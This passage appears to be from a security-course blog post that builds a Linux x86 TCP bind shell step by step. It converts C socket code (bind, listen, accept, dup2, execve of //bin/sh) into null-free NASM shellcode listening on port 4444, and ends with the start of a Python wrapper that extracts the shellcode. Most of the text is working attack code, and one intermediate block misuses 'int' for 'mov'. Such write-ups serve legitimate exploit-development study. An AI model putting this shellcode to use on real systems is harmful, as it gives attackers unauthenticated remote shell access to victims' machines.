<p>The <code>&lt;netinet/in.h&gt;</code> header shall define the following types:</p>
<ul>
<li><code>in_port_t</code> Equivalent to the type uint16_t as described in <code>&lt;inttypes.h&gt;</code></li>
</ul>
</blockquote>
<p>It seems to be an <code>unsigned short</code> integer, just like <code>sa_family_t</code>.</p>
<p>Based on all of this information, now the struct should look like this:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">short</span>      <span class="n">sin_family</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">short</span>      <span class="n">sin_port</span><span class="p">;</span>
  <span class="k">struct</span> <span class="nc">in_addr</span>      <span class="n">sin_addr</span><span class="p">;</span>
<span class="p">};</span>

<span class="k">struct</span> <span class="nc">in_addr</span> <span class="n">sin_addr</span> <span class="p">{</span>
  <span class="kt">unsigned</span> <span class="kt">int</span>        <span class="n">s_addr</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>One of the mistakes I made is to sum the bytes of the variables in order to calculate the size of the struct (<code>short</code> + <code>short</code> + <code>int</code> = <code>8</code> bytes). Long story short: many <code>struct</code> objects use <code>padding</code> for compatibility with different systems.</p>
<p>Moreover, don't forget the definition of <code>sys_socketcall</code>:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">int</span> <span class="nf">syscall</span><span class="p">(</span><span class="n">SYS_socketcall</span><span class="p">,</span> <span class="kt">int</span> <span class="n">call</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">args</span><span class="p">);</span>
</code></pre></div></div>
<p>In particular, in the case of the <code>bind</code> function, you can't use <code>ECX</code>, <code>EDX</code>, and so on, because they would be passed to <code>sys_socketcall</code>. Just like before (see chapter <em>Socket creation</em>), the arguments are passed as a pointer, using the <code>ECX</code> register.</p>
<p>Follows the assembly code:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; INADDR_ANY (0x00000000)</span>
    <span class="nf">dec</span> <span class="nb">ebx</span>
    <span class="nf">push</span> <span class="nb">ebx</span>
    
    <span class="c1">; 0x0002 -&gt; AF_INET</span>
    <span class="c1">; 0x115c -&gt; htons(4444)</span>

    <span class="nf">push</span> <span class="kt">WORD</span> <span class="mh">0x5c11</span>

    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">push</span> <span class="kt">WORD</span> <span class="nb">bx</span>
    <span class="c1">; push 0x5c110002</span>

    <span class="c1">; save the pointer to the struct for later</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
    
    <span class="c1">; 3rd argument of bind(): size of the struct</span>
    <span class="c1">; push 16</span>
    <span class="nf">rol</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">3</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 2nd argument of bind(): pointer to the struct</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; 1st argument of bind(): file descriptor of the server socket</span>
    <span class="nf">mov</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    
    <span class="c1">; syscall socketcall</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 1st argument of socketcall(): call SYS_BIND</span>
    <span class="nf">ror</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">3</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to the parameters of bind()</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>You may be wondering why I used <code>PUSH 16</code> for the 3rd argument of <code>bind()</code>, instead of the current size of struct, which is 8 bytes. As I said before: it's all about <code>padding</code>. Initially, if I used <code>PUSH 8</code>, the call to <code>bind()</code> would return the value <code>0xffffffea</code> (<code>EINVAL</code>), which means one of the arguments is invalid.</p>
<p>Later, I discovered the right size of the struct is <code>16</code> bytes (doing a simple <code>printf</code> of <code>sizeof(server_address)</code>). However, the real reason can be inferred from the definition of the struct:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define __SOCK_SIZE__   16              </span><span class="cm">/* sizeof(struct sockaddr)      */</span><span class="cp">
</span>
<span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="p">{</span>
  <span class="n">__kernel_sa_family_t</span>  <span class="n">sin_family</span><span class="p">;</span>     <span class="cm">/* Address family               */</span>
  <span class="n">__be16</span>                <span class="n">sin_port</span><span class="p">;</span>       <span class="cm">/* Port number                  */</span>
  <span class="k">struct</span> <span class="nc">in_addr</span>        <span class="n">sin_addr</span><span class="p">;</span>       <span class="cm">/* Internet address             */</span>

  <span class="cm">/* Pad to size of `struct sockaddr'. */</span>
  <span class="kt">unsigned</span> <span class="kt">char</span>         <span class="n">__pad</span><span class="p">[</span><span class="n">__SOCK_SIZE__</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">short</span> <span class="kt">int</span><span class="p">)</span> <span class="o">-</span>
                        <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span><span class="p">)</span> <span class="o">-</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">in_addr</span><span class="p">)];</span>
<span class="p">};</span>
</code></pre></div></div>
<p>As you can see, it uses padding bytes in order to reach a size of <code>16</code> bytes.</p>
<h4 id="listening-for-connections">Listening for connections</h4>
<p>Next, we need to convert the following line into assembly:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// set it as a passive socket that listens for connections</span>
<span class="n">listen</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</code></pre></div></div>
<p>Based on previous findings, the second argument of <code>socketcall</code> should be <code>SYS_LISTEN</code> (<code>4</code>).</p>
<p>Follows the assembly code:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; 2nd argument of listen(): set backlog (connection queue size) to 1</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">1</span>

    <span class="nf">push</span> <span class="mi">1</span>
</code></pre></div></div>
<p><sub class='aside'>I thought <code>push 1</code> is interpreted as <code>push</code> <code>0x00000001</code>, but <a href="http://sparksandflames.com/files/x86InstructionChart.html">it seems</a> the opcode <code>6A</code> can be used to push a single byte as a 32-bit value
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; 1st argument of listen(): file descriptor of the server socket</span>
    <span class="nf">push</span> <span class="nb">esi</span>
    
    <span class="c1">; syscall socketcall</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 1st argument of socketcall(): SYS_LISTEN call</span>
    <span class="c1">; mov ebx, 4</span>
    <span class="nf">rol</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to listen() arguments</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; execute listen()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<h4 id="accepting-connections">Accepting connections</h4>
<p>It's time to accept incoming connections from clients (max 1 client in this case). We need to convert the following C code into assembly:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">size_client_socket_struct</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr_in</span><span class="p">);</span>
<span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_client_socket_struct</span><span class="p">);</span>
</code></pre></div></div>
<p>Follows the assembly code:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; 3rd argument of accept(): size of client_address struct</span>
    <span class="nf">rol</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 2nd argument of accept: client_address struct, in this case empty</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">push</span> <span class="nb">ebx</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 1st argument of accept: file descriptor of the server socket</span>
    <span class="nf">push</span> <span class="nb">esi</span>

    <span class="c1">; syscall socketcall</span>
    <span class="c1">; mov eax, 102</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 1st argument of socketcall(): SYS_ACCEPT call</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">5</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to accept() arguments</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; execute accept()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<h4 id="io-redirection">I/O Redirection</h4>
<p>As mentioned previously, the redirection of <code>input</code>/<code>output</code>/<code>error</code> is performed by means of the function <code>dup2</code>. The call to <code>accept()</code> returns the File Descriptor associated with the Client Socket.</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
<span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>
</code></pre></div></div>
<p>According to the file <code>/usr/include/i386-linux-gnu/asm/unistd_32.h</code>, <code>dup2</code> is the syscall <code>#63</code>. Given this information, we're now ready to convert the code above into assembly:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; save the Client File Descriptor for later use</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>

    <span class="c1">; dup2(client_socket_fd, 0)</span>
    <span class="nf">int</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">63</span>
    <span class="nf">int</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>
    <span class="nf">int</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">0</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; dup2(client_socket_fd, 1)</span>
    <span class="nf">int</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">63</span>
    <span class="nf">int</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>
    <span class="nf">int</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">1</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; dup2(client_socket_fd, 2)</span>
    <span class="nf">int</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">63</span>
    <span class="nf">int</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>
    <span class="nf">int</span> <span class="nb">ecx</span><span class="p">,</span> <span class="mi">02</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p>This is good enough, but I wanted a better approach, one that uses fewer bytes and it's also free of <code>NULL</code> ones:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; loop counter (repeats dup2() three times)</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">3</span>

    <span class="c1">; save Client File Descriptor for later use</span>
    <span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>

<span class="nl">RepeatDuplicate:</span>
    <span class="c1">; save ecx since it's modified later</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; dup2() syscall</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">63</span>

    <span class="c1">; Client file descriptor</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>

    <span class="c1">; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>

    <span class="c1">; call dup2()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; restore ecx and check if loop is over</span>
    <span class="nf">pop</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">RepeatDuplicate</span>
</code></pre></div></div>
<p>In the code above, the <code>loop</code> instruction is used to repeat the routine <code>RepeatDuplicate</code> three times, for <code>error</code> (fd: 2), <code>output</code> (fd: 1), and <code>input</code> (fd: 0).</p>
<h4 id="command-execution">Command Execution</h4>
<p>Finally, to have a fully-functional bind shell, we need to convert the following block of code into assembly:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// receive data from client (max 1024 bytes)</span>
<span class="k">while</span> <span class="p">((</span><span class="n">bytes_read</span> <span class="o">=</span> <span class="n">recv</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">client_command</span><span class="p">,</span> <span class="mi">1024</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// execute client command</span>
    <span class="n">system</span><span class="p">(</span><span class="n">client_command</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">client_command</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">client_command</span><span class="p">));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Follows the syscall numbers:</p>
<ul>
<li><code>recv</code>: invoked via <code>socketcall</code> (<code>SYS_RECV</code>: <code>10</code>)</li>
<li><code>system</code>: it's a wrapper, so we're going to use <code>execve</code></li>
<li><code>memset</code>: there's no syscall</li>
</ul>
<p>It seems we're missing some functions. Therefore, I decided to reimplement it manually:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">ReceiveData:</span>

    <span class="nf">xor</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ecx</span>
    <span class="nf">mov</span> <span class="nb">ch</span><span class="p">,</span> <span class="mi">4</span>
    <span class="nf">lea</span> <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nv">ReceivedData</span><span class="p">]</span>

<span class="nl">ClearCommandBuffer:</span>

    <span class="nf">mov</span> <span class="p">[</span><span class="nb">eax</span><span class="p">],</span> <span class="kt">BYTE</span> <span class="nb">bl</span>
    <span class="nf">inc</span> <span class="nb">eax</span> 
    <span class="nf">dec</span> <span class="nb">ecx</span> 
    <span class="nf">loop</span> <span class="nb">Cl</span><span class="nv">earCommandBuffer</span>
</code></pre></div></div>
<p><sub class='aside'>Implementation of <code>memset</code>, loop 1024 times in order to clear the buffer
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="c1">; 4th argument of recv(): NO flags</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 3rd argument of recv(): size of the buffer that stores the command received</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">inc</span> <span class="nb">ebx</span>
    <span class="nf">rol</span> <span class="nb">bx</span><span class="p">,</span> <span class="mi">10</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="c1">; 2nd argument of recv(): pointer to the aforementione buffer</span>
    <span class="nf">push</span> <span class="nv">ReceivedData</span>

    <span class="c1">; Client File Descriptor</span>
    <span class="nf">push</span> <span class="nb">edi</span>

    <span class="c1">; syscall #102: socketcall()</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">102</span>

    <span class="c1">; 1st argument of socketcall(): call SYS_RECV</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">mov</span> <span class="nb">bl</span><span class="p">,</span> <span class="mi">10</span>

    <span class="c1">; 2nd argument of socketcall(): pointer to the arguments of SYS_RECV</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; invoke socketcall()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>Use <code>socketcall</code> to call <code>recv</code> and receive the command to be executed
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">cmp</span> <span class="nb">al</span><span class="p">,</span> <span class="mh">0xff</span>
    <span class="nf">je</span> <span class="nv">Exit</span>

    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">2</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; if the return value of fork() == 0, it means we're in the child process</span>
    <span class="nf">xor</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">cmp</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">ebx</span>
    <span class="nf">jne</span> <span class="nv">ReceiveData</span>
</code></pre></div></div>
<p><sub class='aside'>After the <code>fork</code>, the <em>parent</em> process waits for data to be received, while the <em>child</em> process executes the command received just now
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">ExecuteCommand:</span>

    <span class="nf">xor</span> <span class="nb">esi</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">push</span> <span class="nb">esi</span>

    <span class="nf">push</span> <span class="mh">0x68732f6e</span>
    <span class="nf">push</span> <span class="mh">0x69622f2f</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
</code></pre></div></div>
<p><sub class='aside'>String <code>//bin/sh</code>
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">mov</span> <span class="nb">ax</span><span class="p">,</span> <span class="mh">0x632d</span>
    <span class="nf">push</span> <span class="nb">eax</span>

    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esp</span>
</code></pre></div></div>
<p><sub class='aside'>String <code>-c</code>
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">push</span> <span class="nb">esi</span>
    <span class="nf">push</span> <span class="nv">ReceivedData</span>
    <span class="nf">push</span> <span class="nb">eax</span>
    <span class="nf">push</span> <span class="nb">ebx</span>

    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="nf">push</span> <span class="nb">esi</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>After executing the command (syscall 11: <code>execve</code>), the child process exits gracefully
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">Exit:</span>

    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">esi</span>
    <span class="nf">inc</span> <span class="nb">eax</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

<span class="nf">section</span> <span class="nv">.bss</span>

    <span class="nl">ReceivedData:</span>   <span class="kd">resb</span> <span class="mi">1024</span>
</code></pre></div></div>
<p>To summarise: after redirecting input, output, and error, the program waits to receive data from the Client Socket, using the routine <code>ReceiveData</code>, which also clear the buffer to prevent corruption.</p>
<p>After receiving the command, the <code>fork</code> syscall is employed. The reason is due to how <code>execve</code> works: once it executes the command, it process exits, so it wouldn't return to receiving other data. In this case, forking allows us to keep a <code>parent process</code> that receives commands, and spawn a <code>child process</code> for each command executed.</p>
<h2 id="final-attempt">Final attempt</h2>
<p>Follows the visual representation of the final implementation:</p>
<p><img src="/assets/img/slae32/bind_shellcode_tcp_2.jpg" alt="Final Implementation of Bind Shell TCP" />
<em>My final implementation of a TCP Bind Shell</em></p>
<h3 id="c-code-1">C Code</h3>
<p>After finishing the second assignment, I noticed the shellcode I wrote uses too many instructions. To be more specific, the final block (<code>recv-memset-system</code>) is superfluous. In fact, once you redirect <code>stdin</code>, <code>stdout</code> and <code>stderr</code>, you can simply spawn a shell and the job is done:</p>
<div class="language-cpp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;netinet/ip.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">server_socket_fd</span><span class="p">,</span> <span class="n">client_socket_fd</span><span class="p">,</span> <span class="n">size_client_socket_struct</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">sockaddr_in</span> <span class="n">server_address</span><span class="p">,</span> <span class="n">client_address</span><span class="p">;</span>

    <span class="c1">// create a TCP socket</span>
    <span class="n">server_socket_fd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="n">IPPROTO_TCP</span><span class="p">);</span>

    <span class="n">server_address</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
    <span class="n">server_address</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
    <span class="n">server_address</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span><span class="mi">4444</span><span class="p">);</span>

    <span class="c1">// bind the socket to 0.0.0.0:4444</span>
    <span class="n">bind</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">server_address</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">server_address</span><span class="p">));</span>

    <span class="c1">// passive socket that listens for connections</span>
    <span class="n">listen</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>

    <span class="c1">// accept incoming connection</span>
    <span class="n">size_client_socket_struct</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr_in</span><span class="p">);</span>
    <span class="n">client_socket_fd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">server_socket_fd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="nc">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">client_address</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">size_client_socket_struct</span><span class="p">);</span>

    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="n">dup2</span><span class="p">(</span><span class="n">client_socket_fd</span><span class="p">,</span> <span class="mi">2</span><span class="p">);</span>

    <span class="n">system</span><span class="p">(</span><span class="s">"/bin/bash"</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>
<h3 id="assembly-1">Assembly</h3>
<p>Here's the assembly code that starts from the <code>RepeatDuplicate</code> label:</p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nl">RepeatDuplicate:</span>
    <span class="c1">; save ecx since it's modified later</span>
    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; dup2() syscall</span>
    <span class="nf">mov</span> <span class="nb">eax</span><span class="p">,</span> <span class="mi">63</span>

    <span class="c1">; Client file descriptor</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">edi</span>

    <span class="c1">; Redirect this file descriptor (stdin/stdout/stderr) to the Client File descritptor</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="kt">DWORD</span> <span class="p">[</span><span class="nb">esp</span><span class="p">]</span>
    <span class="nf">dec</span> <span class="nb">ecx</span>

    <span class="c1">; call dup2()</span>
    <span class="nf">int</span> <span class="mh">0x80</span>

    <span class="c1">; restore ecx and check if loop is over</span>
    <span class="nf">pop</span> <span class="nb">ecx</span>
    <span class="nf">loop</span> <span class="nv">RepeatDuplicate</span>

<span class="nl">SpawnShell:</span>

    <span class="nf">push</span> <span class="nb">ecx</span>

    <span class="c1">; argv, 2nd argument of execve</span>
    <span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; envp, 3rd argument of execve</span>
    <span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
</code></pre></div></div>
<p><sub class='aside'><code>ECX</code> and <code>EDX</code> are pointers to <code>NULL</code>, so <strong>argv</strong> and <strong>envp</strong> are empty
</sub></p>
<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="nf">push</span> <span class="mh">0x68732f6e</span>
    <span class="nf">push</span> <span class="mh">0x69622f2f</span>
    <span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>

    <span class="c1">; exceve syscall</span>
    <span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
    <span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
    <span class="nf">int</span> <span class="mh">0x80</span>
</code></pre></div></div>
<p><sub class='aside'>Call <code>execve</code> on <code>//bin/sh</code>
</sub></p>
<p>As you can see, after it redirects input, output, and error, the <code>execve</code> syscall spawns an SH shell.</p>
<h2 id="automation">Automation</h2>
<p>One of the requirements of the assignment is to be able to easily configure the TCP port. I decided to write <code>python</code> script that acts as a wrapper (script named <code>wrapper.py</code>):</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">argparse</span>
<span class="kn">import</span> <span class="nn">traceback</span>
<span class="kn">import</span> <span class="nn">subprocess</span>


<span class="k">def</span> <span class="nf">print_shellcode</span><span class="p">(</span><span class="n">object_file_path</span><span class="p">):</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">command</span> <span class="o">=</span> <span class="p">[</span><span class="s">"objcopy"</span><span class="p">,</span> <span class="s">"-O"</span><span class="p">,</span> <span class="s">"binary"</span><span class="p">,</span> <span class="s">"-j"</span><span class="p">,</span> <span class="s">".text"</span><span class="p">,</span> <span class="n">object_file_path</span><span class="p">,</span> <span class="s">"/dev/stdout"</span><span class="p">]</span>
        <span class="n">proc</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">command</span><span class="p">,</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">PIPE</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="n">traceback</span><span class="p">.</span><span class="n">format_exc</span><span class="p">())</span>
        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</code></pre></div></div>
<p><sub class='aside'>The binary <code>objcopy</code> belongs to the package <code>binutils</code>, which must be installed, otherwise the program will throw an error
</sub></p>
